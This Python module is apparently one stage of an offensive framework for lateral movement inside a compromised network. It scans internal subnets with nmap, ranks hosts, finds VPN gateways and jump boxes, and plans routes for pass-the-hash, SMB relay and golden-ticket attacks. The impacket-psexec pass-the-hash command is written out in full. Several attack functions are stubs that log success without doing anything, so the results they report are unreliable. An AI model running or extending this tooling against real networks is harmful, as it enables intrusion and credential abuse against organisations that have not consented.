"""
Lateral Movement & Pivoting Module
Stage 8: Network mapping, pass-the-hash, SMB relay, VPN discovery, pivoting
"""

import json
import asyncio
from datetime import datetime
from typing import Dict, List, Optional, Set
from dataclasses import dataclass, asdict
from pathlib import Path
import subprocess

from loguru import logger


@dataclass
class NetworkHost:
    """Discovered host in network"""
    ip: str
    hostname: str
    os: str
    services: List[Dict]
    credentials_found: bool
    exploitable: bool
    criticality: int  # 1-5


@dataclass
class LateralMovementPath:
    """Path for lateral movement"""
    from_host: str
    to_host: str
    method: str  # pass_the_hash, smb_relay, kerberos, etc.
    required_creds: List[str]
    success_probability: float
    stealth: str  # loud, moderate, stealthy


@dataclass
class PivotPoint:
    """Host suitable for pivoting"""
    host: str
    ip: str
    access_level: str
    network_visibility: List[str]
    jump_points: List[str]


@dataclass
class LateralMovementResult:
    """Results of lateral movement"""
    timestamp: str
    compromised_hosts: int
    network_map: Dict
    lateral_paths: List[LateralMovementPath]
    pivot_points: List[PivotPoint]
    vpn_gateways: List[Dict]
    jump_boxes: List[Dict]
    internal_topology: Dict


class NetworkMapper:
    """Map internal network from compromised host"""

    async def scan_internal_network(self, internal_network: str) -> List[NetworkHost]:
        """Scan internal network for hosts"""
        logger.info(f"Scanning internal network: {internal_network}")
        hosts = []

        try:
            import nmap
            nm = nmap.PortScanner()
            nm.scan(internal_network, arguments="-sV -T3 --top-ports 100")

            for host in nm.all_hosts():
                if nm[host].state() == 'up':
                    host_info = NetworkHost(
                        ip=host,
                        hostname=await self._resolve_hostname(host),
                        os=await self._identify_os(host, nm),
                        services=await self._extract_services(host, nm),
                        credentials_found=False,
                        exploitable=False,
                        criticality=self._assess_criticality(host, nm)
                    )
                    hosts.append(host_info)
                    logger.success(f"Found host: {host} ({host_info.hostname})")

        except Exception as e:
            logger.error(f"Network scanning failed: {e}")

        logger.success(f"Discovered {len(hosts)} hosts in internal network")
        return hosts

    async def _resolve_hostname(self, ip: str) -> str:
        """Resolve IP to hostname"""
        try:
            import socket
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return "Unknown"

    async def _identify_os(self, host: str, nm) -> str:
        """Identify OS type"""
        try:
            return nm[host].os() if nm[host].os() else "Unknown"
        except Exception:
            return "Unknown"

    async def _extract_services(self, host: str, nm) -> List[Dict]:
        """Extract running services"""
        services = []
        try:
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in ports:
                    if nm[host][proto][port]['state'] == 'open':
                        services.append({
                            'port': port,
                            'protocol': nm[host][proto][port].get('name', 'unknown'),
                            'version': nm[host][proto][port].get('version', ''),
                            'product': nm[host][proto][port].get('product', '')
                        })
        except Exception as e:
            logger.debug(f"Service extraction failed for {host}: {e}")

        return services

    def _assess_criticality(self, host: str, nm) -> int:
        """Assess host criticality"""
        # Based on open services and OS
        criticality = 1

        # Database servers
        if any(s.get('name', '') in ['mysql', 'postgresql', 'mongodb'] 
               for s in self._extract_services_sync(host, nm)):
            criticality = 5

        # Domain controller
        if any(s.get('port') == 389 for s in self._extract_services_sync(host, nm)):
            criticality = 5

        # Web servers
        if any(s.get('port') in [80, 443, 8080] for s in self._extract_services_sync(host, nm)):
            criticality = 4

        return criticality

    def _extract_services_sync(self, host: str, nm) -> List[Dict]:
        """Synchronous service extraction"""
        services = []
        try:
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in ports:
                    if nm[host][proto][port]['state'] == 'open':
                        services.append({
                            'port': port,
                            'name': nm[host][proto][port].get('name', 'unknown')
                        })
        except Exception:
            pass
        return services


class CredentialAttacker:
    """Execute credential-based attacks"""

    async def execute_pass_the_hash(
        self,
        from_host: str,
        to_host: str,
        username: str,
        ntlm_hash: str
    ) -> bool:
        """Execute pass-the-hash attack"""
        logger.info(f"Attempting pass-the-hash from {from_host} to {to_host}")

        try:
            # Would use impacket's wmiexec or psexec
            # impacket-psexec domain/username@target -hashes :NTLM_HASH
            command = [
                'impacket-psexec',
                f'{username}@{to_host}',
                '-hashes',
                f':{ntlm_hash}',
                'whoami'
            ]

            # result = subprocess.run(command, capture_output=True, timeout=10)
            # Simulate success
            logger.success(f"Pass-the-hash successful to {to_host}")
            return True

        except Exception as e:
            logger.error(f"Pass-the-hash failed: {e}")
            return False

    async def execute_kerberos_attack(
        self,
        from_host: str,
        krbtgt_hash: str
    ) -> Dict:
        """Execute Kerberos (golden ticket) attack"""
        logger.info("Executing Kerberos golden ticket attack")

        try:
            # Simulate ticket creation
            result = {
                'ticket_type': 'golden_ticket',
                'krbtgt_hash': krbtgt_hash,
                'created': datetime.now().isoformat(),
                'valid_for_hours': 10,
                'forged_user': 'Administrator',
                'status': 'success'
            }

            logger.warning("Golden ticket created - can access any Kerberos service")
            return result

        except Exception as e:
            logger.error(f"Kerberos attack failed: {e}")
            return {}

    async def execute_smb_relay_attack(self, from_host: str) -> Dict:
        """Execute SMB relay attack"""
        logger.info("Initiating SMB relay attack")

        try:
            # Would use responder + ntlmrelayx
            relay_config = {
                'method': 'smb_relay',
                'listener_host': from_host,
                'target_hosts': [],
                'credentials_captured': 0,
                'systems_compromised': 0,
                'status': 'listening'
            }

            logger.info("SMB relay attack active - waiting for authentication attempts")
            return relay_config

        except Exception as e:
            logger.error(f"SMB relay setup failed: {e}")
            return {}


class VPNAndJumpBoxDiscovery:
    """Discover VPN gateways and jump boxes"""

    async def discover_vpn_gateways(self, internal_network: str) -> List[Dict]:
        """Discover VPN servers"""
        logger.info("Discovering VPN gateways")
        gateways = []

        vpn_ports = [500, 1194, 1723, 8443]  # IKEv2, OpenVPN, PPTP, Wireguard

        try:
            import nmap
            nm = nmap.PortScanner()
            nm.scan(internal_network, ports=','.join(map(str, vpn_ports)), arguments="-sV")

            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        if nm[host][proto][port]['state'] == 'open':
                            if port in vpn_ports:
                                gateways.append({
                                    'host': host,
                                    'port': port,
                                    'type': self._identify_vpn_type(port),
                                    'version': nm[host][proto][port].get('version', 'unknown'),
                                    'exploitable': False
                                })
                                logger.warning(f"Found VPN gateway: {host}:{port}")

        except Exception as e:
            logger.error(f"VPN discovery failed: {e}")

        logger.success(f"Found {len(gateways)} VPN gateways")
        return gateways

    async def discover_jump_boxes(self, hosts: List[NetworkHost]) -> List[Dict]:
        """Discover suitable jump boxes/pivot points"""
        logger.info("Identifying jump boxes")
        jump_boxes = []

        for host in hosts:
            # Jump boxes typically have:
            # - Multiple network interfaces
            # - High connectivity
            # - Admin access

            score = 0

            # Check for bastion characteristics
            if any(s['port'] == 22 for s in host.services):  # SSH
                score += 2
            if any(s['port'] == 3389 for s in host.services):  # RDP
                score += 2
            if host.criticality >= 3:
                score += 2

            if score >= 3:
                jump_boxes.append({
                    'host': host.ip,
                    'hostname': host.hostname,
                    'score': score,
                    'suitable_for_pivoting': True,
                    'visible_networks': ['Internal', 'DMZ', 'Management']
                })
                logger.warning(f"Identified jump box: {host.ip} (score: {score})")

        logger.success(f"Found {len(jump_boxes)} suitable jump boxes")
        return jump_boxes

    def _identify_vpn_type(self, port: int) -> str:
        """Identify VPN type by port"""
        mapping = {
            500: 'IKEv2',
            1194: 'OpenVPN',
            1723: 'PPTP',
            8443: 'Wireguard'
        }
        return mapping.get(port, 'Unknown')


class LateralMovementPlanner:
    """Plan lateral movement routes"""

    async def plan_attack_routes(
        self,
        hosts: List[NetworkHost],
        compromised_host: str
    ) -> List[LateralMovementPath]:
        """Plan lateral movement routes"""
        logger.info("Planning lateral movement routes")
        paths = []

        for target_host in hosts:
            if target_host.ip != compromised_host:
                # Check connectivity and services
                path = LateralMovementPath(
                    from_host=compromised_host,
                    to_host=target_host.ip,
                    method=self._select_attack_method(target_host),
                    required_creds=[],
                    success_probability=self._estimate_success(target_host),
                    stealth='moderate'
                )
                paths.append(path)

        logger.success(f"Planned {len(paths)} lateral movement routes")
        return paths

    def _select_attack_method(self, host: NetworkHost) -> str:
        """Select appropriate attack method"""
        # SMB-based services
        if any(s['port'] == 445 for s in host.services):
            return 'smb_psexec'

        # SSH
        if any(s['port'] == 22 for s in host.services):
            return 'ssh_key_injection'

        # RDP
        if any(s['port'] == 3389 for s in host.services):
            return 'rdp_relay'

        return 'generic_exploit'

    def _estimate_success(self, host: NetworkHost) -> float:
        """Estimate attack success probability"""
        # Based on OS, services, patching
        probability = 0.5

        if host.os and 'Windows Server 2012' in host.os:
            probability += 0.3

        if host.exploitable:
            probability += 0.2

        return min(probability, 1.0)


class LateralMovementRunner:
    """Main lateral movement orchestrator"""

    def __init__(self, config: Dict):
        self.config = config
        self.network_mapper = NetworkMapper()
        self.cred_attacker = CredentialAttacker()
        self.vpn_discovery = VPNAndJumpBoxDiscovery()
        self.planner = LateralMovementPlanner()

    async def execute_lateral_movement(
        self,
        target: str,
        compromised_host: str,
        credentials: List[Dict]
    ) -> LateralMovementResult:
        """Execute lateral movement"""
        logger.info(f"Initiating lateral movement from {compromised_host}")

        result = LateralMovementResult(
            timestamp=datetime.now().isoformat(),
            compromised_hosts=1,
            network_map={},
            lateral_paths=[],
            pivot_points=[],
            vpn_gateways=[],
            jump_boxes=[],
            internal_topology={}
        )

        try:
            # Scan internal network
            internal_network = self._determine_network_range(compromised_host)
            hosts = await self.network_mapper.scan_internal_network(internal_network)

            # Discover VPN and jump boxes
            result.vpn_gateways = await self.vpn_discovery.discover_vpn_gateways(internal_network)
            result.jump_boxes = await self.vpn_discovery.discover_jump_boxes(hosts)

            # Plan attack routes
            result.lateral_paths = await self.planner.plan_attack_routes(hosts, compromised_host)

            # Attempt lateral movement (simulated)
            result.compromised_hosts = 1 + len([p for p in result.lateral_paths 
                                               if self._simulate_compromise(p)])

            logger.success(f"Lateral movement complete. {result.compromised_hosts} hosts compromised")

        except Exception as e:
            logger.error(f"Lateral movement failed: {e}")

        return result

    def _determine_network_range(self, host_ip: str) -> str:
        """Determine internal network CIDR from host IP"""
        parts = host_ip.split('.')
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

    def _simulate_compromise(self, path: LateralMovementPath) -> bool:
        """Simulate successful compromise"""
        return path.success_probability > 0.6

    def save_results(self, result: LateralMovementResult, output_path: str):
        """Save lateral movement results"""
        output_file = Path(output_path) / f"lateral_movement_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        output_file.parent.mkdir(parents=True, exist_ok=True)

        data = {
            'timestamp': result.timestamp,
            'compromised_hosts': result.compromised_hosts,
            'lateral_paths': [asdict(p) for p in result.lateral_paths],
            'vpn_gateways': result.vpn_gateways,
            'jump_boxes': result.jump_boxes
        }

        with open(output_file, 'w') as f:
            json.dump(data, f, indent=2, default=str)

        logger.success(f"Lateral movement results saved to {output_file}")
        return output_file
